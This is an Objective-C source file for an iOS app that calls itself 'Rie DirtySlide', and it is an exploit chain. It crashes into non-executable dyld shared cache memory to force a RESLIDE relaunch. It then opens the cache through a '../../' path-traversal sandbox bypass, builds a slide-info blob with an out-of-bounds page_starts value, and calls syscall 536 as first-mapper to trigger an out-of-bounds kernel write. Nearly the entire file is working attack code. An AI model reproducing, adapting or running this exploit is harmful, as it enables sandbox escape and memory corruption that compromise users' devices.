//
//  ViewController.m — Rie DirtySlide: DSC crash → RESLIDE relaunch → first-mapper
//
//  Technique:
//    1. Find NX (non-executable) page within dyld shared cache via VM region scan
//    2. Jump to NX page → crash with OS_REASON_FLAG_SHAREDREGION_FAULT (0x400)
//    3. runningboardd sets ReslideSharedCache → launchd relaunches app with RESLIDE
//    4. On relaunch: fresh empty shared region → first-mapper → syscall 536
//

#import "ViewController.h"
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <mach/vm_map.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <errno.h>
#import <fcntl.h>
#import <sys/mman.h>
#import <sys/stat.h>
#import <spawn.h>

// ── Rie types (same as reference exploit sr_cfg.h) ──
#ifndef _POSIX_SPAWN_RESLIDE
#define _POSIX_SPAWN_RESLIDE 0x0800
#endif
#ifndef POSIX_SPAWN_START_SUSPENDED
#define POSIX_SPAWN_START_SUSPENDED 0x0100
#endif
#ifndef F_ADDFILESIGS_RETURN
#define F_ADDFILESIGS_RETURN 97
#endif
#define RIE_SR_CFG_MAGIC 0x53524347u

typedef uint64_t              rie_mach_vm_address_t;
typedef uint64_t              rie_mach_vm_size_t;
typedef natural_t             rie_vm_region_info_t[24];
typedef void                 *rie_vm_region_recurse_info_t;

typedef kern_return_t (*Rie_VMRegionRecurseFn)(vm_map_t, rie_mach_vm_address_t *,
    rie_mach_vm_size_t *, natural_t *, rie_vm_region_recurse_info_t, mach_msg_type_number_t *);
typedef kern_return_t (*Rie_VMReadOverwriteFn)(vm_map_t, rie_mach_vm_address_t,
    rie_mach_vm_size_t, rie_mach_vm_address_t, rie_mach_vm_size_t *);

struct rie_sr_file {
    int      sf_fd;
    uint32_t sf_mappings_count;
    uint32_t sf_slide;
};

struct rie_sr_mapping {
    uint64_t sms_address;
    uint64_t sms_size;
    uint64_t sms_file_offset;
    uint64_t sms_slide_size;
    uint64_t sms_slide_start;
    uint32_t sms_max_prot;
    uint32_t sms_init_prot;
};

struct rie_sr_cfg {
    uint32_t magic;
    uint32_t _pad;
    uint64_t fault_addr;
    uint64_t blob_off;
    uint64_t blob_size;
    struct   rie_sr_file files[3];
    struct   rie_sr_mapping mappings[3];
};

typedef struct {
    void     *fs_blob_start;
    size_t    fs_blob_size;
    off_t     fs_file_start;
} rie_fsignatures_t;

// ── Interface ──
@interface ViewController ()
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *crashButton;     // Stage 1: trigger DSC crash
@property (nonatomic, strong) UIButton *exploitButton;   // Stage 2: first-mapper exploit
@property (nonatomic, strong) UILabel  *statusLabel;
@property (nonatomic, assign) BOOL     isRelaunched;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];

    // Check if we're in the RESLIDE relaunch
    self.isRelaunched = [self checkRelaunchFlag];

    // Status label
    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 60, self.view.bounds.size.width - 40, 60)];
    self.statusLabel.textColor = [UIColor whiteColor];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.numberOfLines = 3;
    self.statusLabel.font = [UIFont boldSystemFontOfSize:16];
    if (self.isRelaunched) {
        self.statusLabel.text = @"⚠️ RELAUNCH DETECTED\nStage 2: First-Mapper Ready";
        self.statusLabel.textColor = [UIColor greenColor];
    } else {
        self.statusLabel.text = @"Stage 1: Trigger DSC Crash\n→ RESLIDE on next launch";
        self.statusLabel.textColor = [UIColor yellowColor];
    }
    [self.view addSubview:self.statusLabel];

    // Crash button (Stage 1)
    self.crashButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.crashButton.frame = CGRectMake(40, 140, self.view.bounds.size.width - 80, 60);
    self.crashButton.backgroundColor = [UIColor redColor];
    [self.crashButton setTitle:@"💀 Trigger DSC NX Crash" forState:UIControlStateNormal];
    [self.crashButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.crashButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    self.crashButton.layer.cornerRadius = 12;
    [self.crashButton addTarget:self action:@selector(triggerDSCCrash) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.crashButton];

    // Exploit button (Stage 2)
    self.exploitButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.exploitButton.frame = CGRectMake(40, 220, self.view.bounds.size.width - 80, 60);
    self.exploitButton.backgroundColor = self.isRelaunched ? [UIColor colorWithRed:0 green:0.6 blue:0 alpha:1] : [UIColor darkGrayColor];
    [self.exploitButton setTitle:@"⚡ First-Mapper Exploit (536)" forState:UIControlStateNormal];
    [self.exploitButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.exploitButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    self.exploitButton.layer.cornerRadius = 12;
    self.exploitButton.enabled = self.isRelaunched;
    [self.exploitButton addTarget:self action:@selector(runFirstMapper) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.exploitButton];

    // Log view
    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(10, 300, self.view.bounds.size.width - 20, self.view.bounds.size.height - 360)];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1];
    self.logView.textColor = [UIColor greenColor];
    self.logView.font = [UIFont fontWithName:@"Courier" size:11];
    self.logView.editable = NO;
    [self.view addSubview:self.logView];

    [self log:@"=== Rie DirtySlide v1 ==="];
    [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
    [self log:@""];

    // Auto-detect: if relaunched, show info immediately
    if (self.isRelaunched) {
        [self log:@"!! RESLIDE relaunch detected — system gave us a fresh SR !!"];
        [self log:@"Tap 'First-Mapper Exploit' to call syscall 536."];
    } else {
        [self log:@"Tap 'Trigger DSC NX Crash' → app will crash → system will set"];
        [self log:@"ReslideSharedCache → relaunch app → first-mapper ready."];
    }

    // Immediate probe on relaunch
    if (self.isRelaunched) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC),
            dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            [self probeReslideState];
        });
    }
}

// ── Log helper ──
- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *line = [NSString stringWithFormat:@"%@\n", msg];
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
}

// ── Relaunch flag management ──
- (NSString *)flagPath {
    return [NSTemporaryDirectory() stringByAppendingPathComponent:@"rie_dsc.flag"];
}

- (BOOL)checkRelaunchFlag {
    return [[NSFileManager defaultManager] fileExistsAtPath:[self flagPath]];
}

- (void)setRelaunchFlag {
    NSString *path = [self flagPath];
    NSData *d = [@"1" dataUsingEncoding:NSUTF8StringEncoding];
    int fd = open([path UTF8String], O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, d.bytes, d.length);
        fsync(fd);
        close(fd);
    }
    [self log:[NSString stringWithFormat:@"flag written: %@ (exists=%d)", path, [[NSFileManager defaultManager] fileExistsAtPath:path]]];
}

- (void)clearRelaunchFlag {
    [[NSFileManager defaultManager] removeItemAtPath:[self flagPath] error:nil];
}

// ── Stage 1: Find NX region in DSC and jump to it ──
- (uint64_t)findNXInDSC {
    Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
    if (!vrr) {
        [self log:@"!! mach_vm_region_recurse not available"];
        return 0;
    }

    // SR range from v240 logs: base=0x180000000 size=0x84000000
    uint64_t srBase = 0x180000000ULL;
    uint64_t srEnd  = srBase + 0x84000000ULL;

    rie_mach_vm_address_t addr = srBase;
    for (int i = 0; i < 100; i++) {
        rie_vm_region_info_t info;
        memset(info, 0, sizeof(info));
        rie_mach_vm_size_t size = 0;
        natural_t depth = 0;
        mach_msg_type_number_t cnt = sizeof(info) / sizeof(natural_t);

        kern_return_t kr = vrr(mach_task_self(), &addr, &size, &depth,
            (rie_vm_region_recurse_info_t)info, &cnt);
        if (kr != KERN_SUCCESS) break;
        if (addr >= srEnd) break;

        uint32_t prot = info[0];  // protection bits

        // Check: in SR range AND non-executable AND non-zero size
        if (addr >= srBase && size > 0 && !(prot & VM_PROT_EXECUTE)) {
            [self log:[NSString stringWithFormat:@"NX found: addr=0x%llx size=0x%llx prot=%u depth=%d",
                (unsigned long long)addr, (unsigned long long)size, prot, depth]];
            return (uint64_t)addr;
        }

        addr += size;
    }

    [self log:@"!! No NX region found in SR walk"];
    return 0;
}

- (void)triggerDSCCrash {
    [self log:@"\n── Stage 1: Finding NX region in DSC... ──"];
    [self setRelaunchFlag];

    // Find NX page
    uint64_t nxAddr = [self findNXInDSC];
    if (nxAddr == 0) {
        [self log:@"!! Cannot find NX region, aborting"];
        return;
    }

    [self log:[NSString stringWithFormat:@"Target NX: 0x%llx", (unsigned long long)nxAddr]];
    [self log:@"\n💀 JUMPING TO NX — APP WILL CRASH"];
    [self log:@"On next launch, system will RESLIDE this app."];
    [self log:@"Close this app and reopen it.\n"];

    // Flush log to console
    fflush(stdout);
    fflush(stderr);

    // Small delay to ensure flag is synced
    usleep(100000);  // 100ms

    // Jump to non-executable memory in DSC → instant crash
    // The kernel will set OS_REASON_FLAG_SHAREDREGION_FAULT
    typedef void (*nx_fn)(void);
    nx_fn fn = (nx_fn)(uintptr_t)nxAddr;
    fn();

    // Should never reach here
    [self log:@"!! Survived NX jump — something went wrong"];
}

// ── Stage 2: Probe RESLIDE state ──
- (void)probeReslideState {
    [self log:@"\n── Probing RESLIDE state... ──"];

    long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");

    // Check shared region
    uint64_t addr = 0;
    long r = sc(294, &addr);
    [self log:[NSString stringWithFormat:@"syscall(294,&addr): ret=%ld addr=0x%llx", r, (unsigned long long)addr]];

    // Probe syscall 536
    errno = 0;
    long r536 = sc(536, 0, 0, 0, 0);
    [self log:[NSString stringWithFormat:@"syscall(536,0,0,0,0): ret=%ld errno=%d", r536, errno]];

    // Scan VM regions around SR
    Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
    if (vrr) {
        rie_mach_vm_address_t w = 0x180000000ULL;
        for (int i = 0; i < 30; i++) {
            rie_vm_region_info_t info; memset(info, 0, sizeof(info));
            rie_mach_vm_size_t vs = 0; natural_t d = 0;
            mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
            if (vrr(mach_task_self(), &w, &vs, &d, (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
            if (w >= 0x210000000ULL) break;
            if (vs >= 0x1000 && d <= 2) {
                [self log:[NSString stringWithFormat:@"  VM[%d]: a=0x%llx sz=0x%llx prot=%u depth=%d",
                    i, (unsigned long long)w, (unsigned long long)vs, info[0], d]];
            }
            w += vs;
        }
    }
}

// ── Stage 3: First-mapper exploit via syscall 536 ──
- (void)runFirstMapper {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self log:@"\n── Stage 3: First-Mapper Exploit ──"];
        [self clearRelaunchFlag];

        long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");

        // Scan for non-auth slide carrier (from v240 Phase E)
        Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
        Rie_VMReadOverwriteFn  vmr = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");

        if (!vrr || !vmr) {
            [self log:@"!! missing mach_vm_* APIs"];
            return;
        }

        // ── Scan SR for dyld cache headers and non-auth carrier ──
        [self log:@"Scanning SR for dyld cache headers..."];
        uint64_t mainHdrAddr = 0, naHdrAddr = 0;
        uint64_t naAddr = 0, naSize = 0, naFoff = 0, naSlide = 0, naFlags = 0;
        uint32_t naMax = 0, naInit = 0;
        uint64_t csOff = 0, csSz = 0;
        int foundNA = -1;

        rie_mach_vm_address_t walk = 0x180000000ULL;
        for (int segIdx = 0; segIdx < 80; segIdx++) {
            rie_vm_region_info_t info; memset(info, 0, sizeof(info));
            rie_mach_vm_size_t segSize = 0; natural_t segDepth = 1;
            mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
            if (vrr(mach_task_self(), &walk, &segSize, &segDepth,
                (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
            if (walk >= 0x204000000ULL) break;
            if (segSize < 4096) { walk += segSize; continue; }

            uint8_t *buf = (uint8_t *)malloc(4096);
            if (!buf) { walk += segSize; continue; }
            memset(buf, 0, 4096);
            rie_mach_vm_size_t outSz = 0;
            kern_return_t kr = vmr(mach_task_self(), walk, 4096,
                (rie_mach_vm_address_t)(uintptr_t)buf, &outSz);
            if (kr == KERN_SUCCESS && outSz >= 16 && memcmp(buf, "dyld_v1", 7) == 0) {
                if (segIdx == 0) mainHdrAddr = walk;
                uint32_t mws_off = *(uint32_t*)(buf + 0x138);
                uint32_t mws_cnt = *(uint32_t*)(buf + 0x13c);
                [self log:[NSString stringWithFormat:@"dyld_v1[%d]: a=0x%llx mws_off=0x%x cnt=%u",
                    segIdx, (unsigned long long)walk, mws_off, mws_cnt]];

                // Read full MWS table
                uint8_t *fullHdr = (uint8_t *)malloc(0x10000);
                if (fullHdr) {
                    memset(fullHdr, 0, 0x10000);
                    rie_mach_vm_size_t fsz = 0;
                    if (vmr(mach_task_self(), walk, 0x10000,
                        (rie_mach_vm_address_t)(uintptr_t)fullHdr, &fsz) == KERN_SUCCESS) {
                        for (uint32_t mi = 0; mi < mws_cnt && mi < 10; mi++) {
                            const uint8_t *m = fullHdr + mws_off + mi * 56;
                            uint64_t a, sz, fo, sl, fl;
                            uint32_t mp, ip;
                            memcpy(&a, m+0, 8); memcpy(&sz, m+8, 8);
                            memcpy(&fo, m+16, 8); memcpy(&sl, m+32, 8);
                            memcpy(&fl, m+40, 8); memcpy(&mp, m+48, 4); memcpy(&ip, m+52, 4);
                            BOOL isSlide = (sl != 0), isAuth = (fl & 1);
                            [self log:[NSString stringWithFormat:@"  MWS[%u]: a=0x%llx sz=0x%llx %@",
                                mi, a, sz, isSlide ? (isAuth ? @"AUTH" : @"<<< NONAUTH <<<") : @"NOSLIDE"]];
                            if (isSlide && !isAuth && foundNA < 0) {
                                foundNA = (int)mi;
                                naAddr = a; naSize = sz; naFoff = fo;
                                naSlide = sl; naFlags = fl;
                                naMax = mp; naInit = ip;
                                naHdrAddr = walk;
                                csOff = *(uint64_t*)(fullHdr + 0x028);
                                csSz  = *(uint64_t*)(fullHdr + 0x030);
                            }
                        }
                    }
                    free(fullHdr);
                }
                if (foundNA >= 0) { free(buf); break; }
            }
            free(buf);
            walk += segSize;
        }

        if (foundNA < 0) {
            [self log:@"!! No non-auth slide carrier found"];
            [self log:@"!! This may mean: not RESLIDE'd, or SR already populated"];
            return;
        }

        [self log:[NSString stringWithFormat:@"\nNONAUTH carrier: MWS[%d] a=0x%llx sz=0x%llx slide=0x%llx",
            foundNA, naAddr, naSize, naSlide]];
        [self log:[NSString stringWithFormat:@"codeSig: 0x%llx+0x%llx", csOff, csSz]];
        [self log:[NSString stringWithFormat:@"mainHdr: 0x%llx carrierHdr: 0x%llx", mainHdrAddr, naHdrAddr]];

        // ── Build slide-info v5 blob with OOB page_starts ──
        #define BLOB_PS 0x4000
        #define BLOB_PC 64
        size_t blobSz = 24 + BLOB_PC * 2;
        uint8_t *blob = (uint8_t *)calloc(1, blobSz);
        if (!blob) { [self log:@"!! blob alloc failed"]; return; }
        {
            uint32_t v5 = 5;
            uint64_t va = 0;
            uint32_t bps = BLOB_PS, bpc = BLOB_PC;
            memcpy(blob, &v5, 4);
            memcpy(blob+4, &bps, 4);
            memcpy(blob+8, &bpc, 4);
            memcpy(blob+16, &va, 8);
            uint16_t *ps = (uint16_t*)(blob+24);
            for (uint32_t j = 0; j < BLOB_PC; j++) ps[j] = 0xFFFF;
            ps[2] = 0xFFFE;  // OOB trigger
            [self log:[NSString stringWithFormat:@"blob: ver=%u page_starts[2]=0xFFFE sz=%zu", v5, blobSz]];
        }

        // ── Build sr_cfg ──
        #define HDR_SZ 0x90000ULL
        #define BLOB_VA (0x180000000ULL + HDR_SZ)
        size_t cfgSz = sizeof(struct rie_sr_cfg) + 0x4000;
        void *cfg = mmap(NULL, cfgSz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        if (cfg == MAP_FAILED) { [self log:@"!! cfg mmap failed"]; free(blob); return; }
        memset(cfg, 0, cfgSz);

        struct rie_sr_cfg *c = (struct rie_sr_cfg *)cfg;
        c->magic = RIE_SR_CFG_MAGIC;
        c->blob_off = 0x4000;
        c->fault_addr = naAddr;
        c->blob_size = blobSz;
        memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);

        // ── Try to open dyld cache via sandbox bypass ──
        int fd_main = -1;
        const char *cachePaths[] = {
            "/System/Library/dyld/",
            "/System/Cryptexes/OS/System/Library/dyld/",
            "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/",
        };
        for (int pi = 0; pi < 3 && fd_main < 0; pi++) {
            char raw[1024];
            snprintf(raw, sizeof(raw), "%s%s%s",
                "../../../../../../../../../../../../../", cachePaths[pi], "dyld_shared_cache_arm64e");
            NSString *nsp = [[NSString stringWithUTF8String:raw] stringByResolvingSymlinksInPath];
            NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
            if (fh) {
                fd_main = dup((int)fh.fileDescriptor);
                [fh closeFile];
                [self log:[NSString stringWithFormat:@"cache OPEN: %@ fd=%d", nsp, fd_main]];
                rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
                fs.fs_file_start = 0;
                uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
                fs.fs_blob_start = (void*)(uintptr_t)(*(uint64_t*)(hb+0x28));
                fs.fs_blob_size = (size_t)(*(uint64_t*)(hb+0x30));
                int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
                [self log:[NSString stringWithFormat:@"F_ADDFILESIGS rc=%d", rc]];
            }
        }

        // Fallback: fd=-1 (in-memory)
        c->files[0].sf_fd = fd_main;
        c->files[0].sf_mappings_count = 1;
        c->files[0].sf_slide = 0;

        if (fd_main < 0) {
            [self log:@"cache fd not found, using fd=-1 (in-memory)"];
        }

        // mappings[0]: TEXT header
        c->mappings[0].sms_address     = 0x180000000ULL;
        c->mappings[0].sms_size         = HDR_SZ;
        c->mappings[0].sms_file_offset  = 0;
        c->mappings[0].sms_max_prot     = 5;
        c->mappings[0].sms_init_prot     = 1;

        // mappings[1]: blob carrier
        c->mappings[1].sms_address     = BLOB_VA;
        c->mappings[1].sms_size         = 0x4000;
        c->mappings[1].sms_file_offset  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
        c->mappings[1].sms_slide_size   = blobSz;
        c->mappings[1].sms_slide_start  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
        c->mappings[1].sms_max_prot     = 5;
        c->mappings[1].sms_init_prot     = 3;

        // mappings[2]: non-auth DX carrier
        c->mappings[2].sms_address     = naAddr;
        c->mappings[2].sms_size         = naSize;
        c->mappings[2].sms_file_offset  = naFoff;
        c->mappings[2].sms_max_prot     = naMax;
        c->mappings[2].sms_init_prot     = naInit;

        [self log:[NSString stringWithFormat:@"cfg: 3 files, 3 mappings, fault=0x%llx blob@0x%llx",
            naAddr, BLOB_VA]];

        // ── Call syscall 536 — first-mapper ──
        [self log:@"\n!! CALLING syscall(536) as first-mapper... !!"];
        errno = 0;
        long r536 = sc(536, 3, c->files, 3, c->mappings);
        [self log:[NSString stringWithFormat:@"syscall(536,...): ret=%ld errno=%d", r536, errno]];

        if (r536 == 0) {
            [self log:@"\n*** FIRST-MAPPER SUCCESS! syscall 536 returned 0! ***"];
            [self log:@"OOB write should have been triggered via page_starts[2]=0xFFFE"];

            // Fault sweep: read from carrier pages to trigger OOB
            [self log:@"\nFault sweep: triggering OOB reads..."];
            uint8_t *carrier = (uint8_t *)mmap(NULL, naSize, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
            if (carrier && carrier != MAP_FAILED) {
                volatile uint8_t dummy;
                for (uint64_t off = 0; off < naSize; off += 0x4000) {
                    // Try to read from each carrier page to trigger page faults
                    Rie_VMReadOverwriteFn vmr2 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
                    if (vmr2) {
                        rie_mach_vm_size_t got = 0;
                        uint8_t byte;
                        vmr2(mach_task_self(), naAddr + off, 1,
                            (rie_mach_vm_address_t)(uintptr_t)&byte, &got);
                    }
                }
                munmap(carrier, naSize);
            }
            [self log:@"Fault sweep complete."];
        } else {
            [self log:[NSString stringWithFormat:@"syscall 536 FAILED: ret=%ld errno=%d", r536, errno]];
            if (errno == 22) {
                [self log:@"EINVAL: not first-mapper, or wrong params"];
            } else if (errno == 2) {
                [self log:@"ENOENT: shared region not found"];
            } else if (errno == 4) {
                [self log:@"EINTR: interrupted or bad fd"];
            }
        }

        free(blob);
        munmap(cfg, cfgSz);
    });
}

@end
